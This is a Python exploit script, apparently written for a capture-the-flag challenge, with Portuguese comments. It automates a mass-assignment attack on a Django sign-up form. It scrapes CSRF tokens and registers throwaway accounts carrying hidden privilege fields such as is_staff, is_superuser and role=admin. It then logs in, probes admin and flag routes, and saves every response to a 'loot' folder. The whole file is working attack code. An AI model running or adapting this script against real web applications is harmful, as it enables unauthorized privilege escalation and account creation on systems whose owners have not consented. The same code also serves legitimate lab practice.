#!/usr/bin/env python3
import re
import os
import json
import secrets
import string
from urllib.parse import urljoin

import requests
from urllib3.exceptions import InsecureRequestWarning

# Desativa warning visual do verify=False no laboratório CTF.
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

TARGET = os.environ.get("TARGET", "https://6cdfd5b0113a794f.chal.ctf.ae").rstrip("/")
BASE = TARGET + "/"

os.makedirs("loot", exist_ok=True)

FLAG_RE = re.compile(r"flag\{[^}\r\n]+\}", re.IGNORECASE)

# Campos candidatos para overposting/mass assignment.
# Em Django, os mais interessantes são is_staff, is_superuser e is_admin.
PAYLOAD_VARIANTS = [
    ("normal_baseline", {}),

    ("is_staff_true", {"is_staff": "true"}),
    ("is_staff_1", {"is_staff": "1"}),
    ("is_staff_on", {"is_staff": "on"}),

    ("is_superuser_true", {"is_superuser": "true"}),
    ("is_superuser_1", {"is_superuser": "1"}),
    ("is_superuser_on", {"is_superuser": "on"}),

    ("is_admin_true", {"is_admin": "true"}),
    ("is_admin_1", {"is_admin": "1"}),
    ("is_admin_on", {"is_admin": "on"}),

    ("admin_true", {"admin": "true"}),
    ("admin_1", {"admin": "1"}),

    ("role_admin", {"role": "admin"}),
    ("role_staff", {"role": "staff"}),
    ("role_hr", {"role": "hr"}),

    ("groups_admin", {"groups": "admin"}),
    ("department_hr", {"department": "HR"}),
    ("department_it", {"department": "IT"}),
    ("title_admin", {"title": "Administrator"}),
    ("position_admin", {"position": "Administrator"}),

    ("combo_staff_superuser", {"is_staff": "true", "is_superuser": "true"}),
    ("combo_admin_role", {"is_admin": "true", "role": "admin"}),
    ("combo_full_django", {"is_staff": "true", "is_superuser": "true", "is_active": "true"}),
]

ROUTES_TO_CHECK = [
    "/",
    "/dashboard/",
    "/profile/",
    "/me/",
    "/account/",
    "/documents/",
    "/admin/",
    "/admin/flag/",
    "/flag/",
    "/internal/",
    "/internal/flag/",
    "/hr/",
    "/hr/flag/",
    "/staff/",
    "/staff/flag/",
]


def rand_suffix(length=8):
    alphabet = string.ascii_lowercase + string.digits
    return "".join(secrets.choice(alphabet) for _ in range(length))


def extract_csrf_from_html(html):
    """
    Extrai o token CSRF do input hidden do Django.
    O cookie csrftoken sozinho não é suficiente, porque o formulário usa
    também o valor csrfmiddlewaretoken no corpo do POST.
    """
    match = re.search(
        r'name=["\']csrfmiddlewaretoken["\']\s+value=["\']([^"\']+)["\']',
        html,
        re.IGNORECASE,
    )
    if match:
        return match.group(1)

    match = re.search(
        r'value=["\']([^"\']+)["\']\s+name=["\']csrfmiddlewaretoken["\']',
        html,
        re.IGNORECASE,
    )
    if match:
        return match.group(1)

    return None


def save_response(label, response):
    """
    Salva cada resposta para revisão manual posterior.
    """
    safe = re.sub(r"[^a-zA-Z0-9_.-]+", "_", label)
    path = f"loot/{safe}.txt"

    with open(path, "w", encoding="utf-8", errors="ignore") as f:
        f.write(f"URL: {response.url}\n")
        f.write(f"STATUS: {response.status_code}\n")
        f.write("HEADERS:\n")
        for k, v in response.headers.items():
            f.write(f"{k}: {v}\n")
        f.write("\nBODY:\n")
        f.write(response.text)

    return path


def show_interesting(label, response):
    """
    Mostra uma visão curta da resposta e verifica flag.
    """
    path = save_response(label, response)
    body = response.text

    print()
    print("=" * 90)
    print(label)
    print("=" * 90)
    print("[*] Status:", response.status_code)
    print("[*] URL final:", response.url)
    print("[*] Arquivo:", path)
    print("[*] Tamanho:", len(body))

    flag = FLAG_RE.search(body)
    if flag:
        print("[+] FLAG ENCONTRADA:", flag.group(0))
        with open("flag.txt", "w", encoding="utf-8") as f:
            f.write(flag.group(0) + "\n")
        print("[+] Flag salva em flag.txt")
        return True

    # Palavras que ajudam a identificar se conseguimos privilégio maior.
    keywords = [
        "flag",
        "admin",
        "staff",
        "superuser",
        "confidential",
        "credential",
        "key-panel",
        "restricted",
        "forbidden",
        "permission",
        "employee",
        "dashboard",
    ]

    lowered = body.lower()
    hits = [kw for kw in keywords if kw in lowered]
    if hits:
        print("[*] Palavras interessantes:", ", ".join(hits))

    # Exibe um snippet pequeno sem poluir demais o terminal.
    compact = re.sub(r"\s+", " ", body)
    print("[*] Snippet:", compact[:350])

    return False


def get_register_csrf(session):
    """
    Abre a página de cadastro e retorna o token CSRF do HTML.
    """
    response = session.get(BASE + "register/", timeout=15, verify=False)
    show_interesting("GET_register_page", response)

    csrf = extract_csrf_from_html(response.text)
    if not csrf:
        print("[-] Não consegui extrair csrfmiddlewaretoken do HTML.")
        return None

    print("[*] CSRF extraído:", csrf[:12] + "...")
    return csrf


def register_user(session, label, extra_fields):
    """
    Faz o cadastro de um usuário usando os campos normais mais campos extras.
    """
    csrf = get_register_csrf(session)
    if not csrf:
        return None

    suffix = rand_suffix()
    username = f"guerreiro_{label}_{suffix}"[:140]
    email = f"guerreiro+{label}.{suffix}@computaria.com"
    password = "Guerreiro@12345"

    data = {
        "csrfmiddlewaretoken": csrf,
        "username": username,
        "email": email,
        "password": password,
        "password_confirm": password,
    }

    # Aqui está o ponto principal do desafio:
    # adicionamos campos que não aparecem no formulário visível.
    data.update(extra_fields)

    headers = {
        "Referer": BASE + "register/",
        "Origin": TARGET,
        "Content-Type": "application/x-www-form-urlencoded",
    }

    response = session.post(
        BASE + "register/",
        data=data,
        headers=headers,
        timeout=15,
        allow_redirects=True,
        verify=False,
    )

    print()
    print("[*] Usuário:", username)
    print("[*] Email:", email)
    print("[*] Campos extras:", json.dumps(extra_fields, ensure_ascii=False))

    if show_interesting(f"REGISTER_{label}", response):
        return {"username": username, "email": email, "password": password, "flag": True}

    return {"username": username, "email": email, "password": password}


def login_user(session, username, password, label):
    """
    Faz login com o usuário criado.
    Alguns apps aceitam username, outros email. Primeiro tentamos username.
    """
    response = session.get(BASE + "login/", timeout=15, verify=False)
    show_interesting(f"GET_login_{label}", response)

    csrf = extract_csrf_from_html(response.text)
    if not csrf:
        print("[-] Não consegui extrair CSRF da tela de login.")
        return False

    headers = {
        "Referer": BASE + "login/",
        "Origin": TARGET,
        "Content-Type": "application/x-www-form-urlencoded",
    }

    # Django normalmente usa username/password.
    login_payloads = [
        {"csrfmiddlewaretoken": csrf, "username": username, "password": password},
        {"csrfmiddlewaretoken": csrf, "email": username, "password": password},
    ]

    for idx, data in enumerate(login_payloads, start=1):
        response = session.post(
            BASE + "login/",
            data=data,
            headers=headers,
            timeout=15,
            allow_redirects=True,
            verify=False,
        )

        if show_interesting(f"LOGIN_{label}_{idx}", response):
            return True

        # Heurística simples: se depois do POST não ficamos em /login/,
        # provavelmente o login funcionou e redirecionou para dashboard.
        if "/login/" not in response.url:
            print("[+] Login aparenta ter funcionado.")
            return True

        # Também pode funcionar mantendo URL, mas com conteúdo de dashboard.
        if "dashboard" in response.text.lower() or "logout" in response.text.lower():
            print("[+] Login aparenta ter funcionado pelo conteúdo.")
            return True

    print("[-] Login não confirmado.")
    return False


def check_routes(session, label):
    """
    Depois do cadastro/login, visita rotas prováveis onde a flag ou painel admin podem estar.
    """
    for route in ROUTES_TO_CHECK:
        url = urljoin(BASE, route.lstrip("/"))
        response = session.get(url, timeout=15, allow_redirects=True, verify=False)

        if show_interesting(f"CHECK_{label}_{route.strip('/').replace('/', '_') or 'root'}", response):
            return True

    return False


def main():
    print("[*] Target:", TARGET)
    print("[*] Testando cadastro com overposting/mass assignment")

    for label, extra in PAYLOAD_VARIANTS:
        print()
        print("#" * 90)
        print("[*] Variante:", label)
        print("#" * 90)

        session = requests.Session()

        user = register_user(session, label, extra)
        if not user:
            continue

        if user.get("flag"):
            return

        # Em alguns apps o cadastro já loga automaticamente.
        if check_routes(session, label):
            return

        # Se não logou automaticamente, fazemos login manual.
        if login_user(session, user["username"], user["password"], label):
            if check_routes(session, label):
                return

    print()
    print("=" * 90)
    print("RESULTADO")
    print("=" * 90)
    print("[-] Flag não encontrada automaticamente.")
    print("[*] Próximo passo: revisar arquivos em loot/ procurando diferenças de permissão.")
    print("[*] Comando útil depois:")
    print("grep -RniE 'flag|admin|staff|superuser|confidential|credential|permission|forbidden|restricted' loot")


if __name__ == "__main__":
    main()
